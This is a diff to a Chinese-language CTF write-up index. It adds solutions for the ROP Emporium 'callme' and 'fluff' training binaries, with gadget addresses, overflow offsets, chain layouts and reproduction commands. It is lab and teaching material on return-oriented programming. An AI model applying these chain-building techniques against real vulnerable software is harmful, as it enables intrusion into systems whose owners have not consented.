@@ -126,6 +126,8 @@
 | L6 | `lab_heap_uaf`（自造） | 函数指针 UAF / 64 位（glibc 2.43） | `heap_uaf` | `struct note {data, fn}`，`free` 只释放不清空；data(0x18→0x20 chunk) 与 struct(0x20 chunk) 同 size class，两次 free 后 tcache 为 `S1,C,S0,A`，下一个 `add` 的 data 正好盖住旧 `struct note` → 改 `fn=backdoor` → `show(stale)` | N/A（堆） | `backdoor=0x401256`、tcache LIFO 顺序 `S1,C,S0,A`、`read_int` 必须逐字节读 |
 | 31 | `ROP Emporium write4` | 任意地址写 → 自造 `"flag.txt"` / 64 位 No PIE | `rop_write_memory` | `mov qword ptr [r14], r15 ; ret` 把 8 字节字符串写进 `.data`；`print_file@plt` 的参数是字符串地址 | **0x28**（`pwnme` 的 `rbp-0x20`，`read` 上限 0x200） | `pop r14;pop r15;ret=0x400690`、`mov [r14],r15;ret=0x400628`、`pop rdi;ret=0x400693`、`print_file@plt=0x400510`、`.data=0x601028` |
 | 32 | `ROP Emporium badchars` | 坏字符过滤 → 编码规避 / 64 位 No PIE | `badchars_encoding` | 坏字符 `x g a .`：`"flag.txt"` 先 `^2` 成 `"dnce,vzv"` 写入 `.data`，再 8 次 `xor byte ptr [r15], r14b` 原地解码；解码地址从 `0x601030` 起（`0x60102e` 会撞 `.`） | **0x28**（`rbp-0x20`，payload 368 B / 上限 512 B） | `pop r12..r15=0x40069c`、`mov [r13],r12=0x400634`、`pop r14;pop r15=0x4006a0`、`xor [r15],r14b=0x400628`、`pop rdi=0x4006a3`、`print_file@plt=0x400510` |
+| 33 | `ROP Emporium callme` | 链式多函数调用 / 64 位 No PIE | `ret2csu` | 依次调用 `callme_one/two/three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`，三个函数都返回后才解密 `encrypted_flag.dat` | **0x28**（`rbp-0x20`，链 160 B / 上限 512 B） | `pop rdi;pop rsi;pop rdx=0x40093c`、`callme_one@plt=0x400720`、`callme_two@plt=0x400740`、`callme_three@plt=0x4006f0` |
+| 34 | `ROP Emporium fluff` | 无写内存原语 → 位运算构字符 / 64 位 No PIE | `badchars_encoding` | 没有 `mov [reg], reg`：`bextr`（`rdx=0x2000`）把 `A - al_prev` 算进 `rbx`，`xlatb` 取 `[A]` 到 `al`，`stosb` 写到 `.bss` 零填充尾巴 | **0x28**（`rbp-0x20`，链 400 B / 上限 512 B） | `xlatb=0x400628`、`bextr=0x40062a`、`stosb=0x400639`、`pop rdi=0x4006a3`、`print_file@plt=0x400510`、写目标 `0x601040` |
 
 ---
 
@@ -1422,6 +1424,103 @@ EXP 里用 `assert not set(payload) & set(b"xga.")` 把三条自检合并成一�
 
 ---
 
+### 3.33 `callme` → `ret2csu`（链式多函数调用，合并传参 gadget）
+
+题目形态：64 位、No PIE、NX、无 canary、Partial RELRO；`callme_one/two/three`
+在配套 `libcallme.so`（`RUNPATH=b'.'`）。`pwnme` 仍是 `char buf[0x20]` +
+`read(0, buf, 0x200)`，偏移 **0x28**。
+
+判定依据（为什么还是 `ret2csu` 类）：**要连续调用多个同签名三参函数**
+（`fn(arg1, arg2, arg3)`），每个函数都要重装三个寄存器。区别在于本题有
+"一条 gadget 装多参"的合并原语，所以不需要 csu：
+
+```text
+000000000040093c <usefulGadgets>:
+  40093c:  pop rdi
+  40093d:  pop rsi
+  40093e:  pop rdx
+  40093f:  ret
+```
+
+| 地址 | gadget / 目标 |
+| --- | --- |
+| `0x40093c` | `pop rdi ; pop rsi ; pop rdx ; ret` |
+| `0x400720` | `callme_one@plt` |
+| `0x400740` | `callme_two@plt` |
+| `0x4006f0` | `callme_three@plt` |
+
+链：`'A'*0x28` + 3 × `[pop3][arg1][arg2][arg3][fn]` + `exit@plt` = **160 B**。
+
+坑点（实测）：
+
+1. **参数是 64 位双写常量**。新版 `libcallme.so` 里是
+   `movabs $0xdeadbeefdeadbeef` / `0xcafebabecafebabe` / `0xd00df00dd00df00d`
+   再 `cmp`，老 writeup 的 32 位值会得到 `Incorrect parameters`。
+2. **顺序必须 one → two → three**，三个函数都返回后 `callme_three` 才解密 flag。
+3. `key1.dat` / `key2.dat` / `encrypted_flag.dat` 是**必需运行时输入**，
+   repro 清理时不能删。而且**不能和 30 放同一目录**：两题的 `encrypted_flag.dat`
+   同名不同内容（`37aa4baf…` vs `3160bfe6…`），覆盖后 30 会静默解不出 flag
+   （实测踩过：矩阵 30 FAIL）。callme 的 5 个文件统一放 `ret2csu/callme_lab/`。
+
+实测：`bash tools/verify_all.sh 33` → PASS，输出 `ROPE{a_placeholder_32byte_flag!}`。
+文档：`ret2csu/{33_ropemporium_callme_speedrun.md,README.md}`。
+
+### 3.34 `fluff` → `badchars_encoding`（没有写内存原语 → 位运算 + 查表 + `stosb`）
+
+题目形态：与 32 同保护（64 位、No PIE、NX、无 canary、Partial RELRO），
+但难点从"字符被过滤"变成"**二进制里根本没有写内存的 gadget**"：
+无 `mov [reg], reg`、无 mem-arithmetic、无 `pop rax/rbx`，只有 `pop rdi`。
+
+```text
+0000000000400628 <questionableGadgets>:
+  400628:  xlat  (%rbx)                         ; al = [rbx + al]
+  400629:  ret
+  40062a:  pop   %rdx
+  40062b:  pop   %rcx
+  40062c:  add   $0x3ef2,%rcx
+  400633:  bextr %rdx,%rcx,%rbx                 ; rbx = (rcx+0x3ef2) 的位窗口
+  400638:  ret
+  400639:  stos  %al,(%rdi)                     ; [rdi] = al ; rdi++
+  40063a:  ret
+```
+
+| 地址 | gadget / 目标 |
+| --- | --- |
+| `0x400628` | `xlatb ; ret` |
+| `0x40062a` | `pop rdx ; pop rcx ; add rcx,0x3ef2 ; bextr rbx,rcx,rdx ; ret` |
+| `0x400639` | `stosb ; ret` |
+| `0x4006a3` | `pop rdi ; ret` |
+| `0x400510` | `print_file@plt` |
+
+原理：`bextr dst, src, ctrl` 是 `dst = (src >> start) & ((1<<len)-1)`，
+`ctrl = start | (len<<8)`。取 `rdx = 0x2000`（start=0, len=32）后
+`rbx = (rcx + 0x3ef2) & 0xffffffff`，**rbx 完全可控**。于是逐字符：
+
+```text
+rbx = A - al_prev          # A 是二进制里任意 [A] == 目标字符 的地址
+xlatb                      # al = [A - al_prev + al_prev] = [A] = 目标字符
+stosb                      # 写进 .bss，rdi++
+```
+
+`al_prev` 是链式状态（上一个写出的字符）；**只有第一个字符的 `al` 需要实测**：
+它等于 `pwnme` 末尾 `puts("Thank you!")` 的返回值，本机 glibc 为 **11**。
+
+段布局是本题的关键约束：`.bss` 只有 `0x601038..0x60103f`（8 B），
+`PT_LOAD` 到 `0x601040` 结束；写 `"flag.txt"`（9 B 含 `\0`）必须落在
+**0x601040**（零填充尾巴，同页可写且天然为 `\0`），不能写 `.bss` 本体。
+
+坑点：
+
+1. **不能"先把 al 清零"**：`.bss` 没有 ≥256 字节零区，`al0=11` 时
+   `0x601038+11` 的值不保证为 0；所以必须拿到真实的 `al0`。
+2. `ROP().find_gadget` 对 `xlatb`/`stosb` 这类单指令 gadget 不可靠，
+   用 `objdump -d` + `ROPgadget` 双查。
+3. 链长 `40 + 16 + 8×40 + 24 = 400 B` < 512，余量还有 112 B。
+
+实测：`bash tools/verify_all.sh 34` → PASS（chain=400 B, al0=11），
+输出 `ROPE{a_placeholder_32byte_flag!}`。
+文档：`badchars_encoding/{34_ropemporium_fluff_speedrun.md,README.md}`。
+
 ## 4. 仓库结构映射（重构前 → 重构后）
 
 | 重构前（按题目建目录） | 重构后（按模式归档） |
@@ -1656,4 +1755,33 @@ bash tools/verify_all.sh 31 32     # 期望 PASS=2 FAIL=0 SKIP=0
 ```
 
 附件备份：`_vendor/ropemporium/{write4,badchars}.zip`；逐文件 sha256 见 `_vendor/attach_manifest.md`。
+
+### 5.9 2026-11-25 新增入库（`callme` / `fluff`，已解决，非 pending）
+
+| 题号 | 来源 | 保护 / 形态 | 落地模式 | 结论 |
+| --- | --- | --- | --- | --- |
+| 33 | `https://ropemporium.com/binary/callme.zip`（zip sha256 `a32deecd…`） | 64 位、No PIE、NX、无 canary、Partial RELRO；`callme_*` 在 `libcallme.so`（`RUNPATH=b'.'`） | `ret2csu` | ✅ `pop rdi;pop rsi;pop rdx=0x40093c` 一次装 3 参，按 one→two→three 调 `(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`，链 160 B |
+| 34 | `https://ropemporium.com/binary/fluff.zip`（zip sha256 `a2d3ab1d…`） | 64 位、No PIE、NX、无 canary、Partial RELRO；无任何写内存 gadget | `badchars_encoding` | ✅ `bextr`（`rdx=0x2000`）算 `rbx`、`xlatb` 取字符、`stosb` 写 `0x601040`，链 400 B，`al0=puts("Thank you!")=11` |
+
+实测坑（这两题各有一个"照抄老 writeup 必翻车"的点）：
+
+1. **callme 的参数是 64 位双写**：`0xdeadbeefdeadbeef` 等，`objdump -d libcallme.so`
+   看 `cmp` 立即数确认；32 位老值只会打印 `Incorrect parameters`。
+2. **callme 的三个 `.dat` 是必需输入，且不能与 30 共用目录**（同名 `encrypted_flag.dat`
+   内容不同，覆盖后 30 静默失败）→ 统一放 `ret2csu/callme_lab/`。
+3. **fluff 的 `al` 初值不能假设为 0**：`.bss` 只有 8 B，没有零区做归一化，
+   必须实测 `puts("Thank you!")` 的返回值（本机 11）。
+4. **fluff 的写目标是 0x601040**（`PT_LOAD` 零填充尾巴），不是 `.bss` 本体
+   （8 B 装不下 9 B 字符串）。
+
+复现：
+
+```bash
+cd '/home/yfhd5/Pwn_Writeups'
+source .venv/bin/activate
+bash tools/verify_all.sh 33 34    # 期望 PASS=2 FAIL=0 SKIP=0
+```
+
+附件备份：`_vendor/ropemporium/{callme,fluff}.zip`；callme 解出的 5 个文件在
+`ret2csu/callme_lab/`；逐文件 sha256 见 `_vendor/attach_manifest.md`。
 
